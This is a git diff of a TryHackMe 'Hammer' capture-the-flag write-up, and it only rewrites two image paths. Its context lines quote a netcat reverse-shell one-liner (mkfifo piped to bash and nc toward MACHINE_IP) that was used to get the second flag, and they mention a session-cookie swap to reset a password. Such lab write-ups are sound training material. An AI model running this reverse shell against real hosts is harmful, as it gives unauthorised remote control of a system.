@@ -168,7 +168,7 @@ After that, I replaced my `PHPSESSID`, entered the valid code, and was able to r
 
 I changed the password and obtained the flag:
 
-![](images/flag1.png)
+![](TryHackMe/Red%20Team/Medium/Hammer/images/flag1.png)
 
 ---
 
@@ -202,7 +202,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc MACHINE_IP 4444 >/tmp/f
 
 I caught a connection and obtained the second flag:
 
-![](images/reverse_shell.png)
+![](TryHackMe/Red%20Team/Medium/Hammer/images/reverse_shell.png)
 
 ---
 
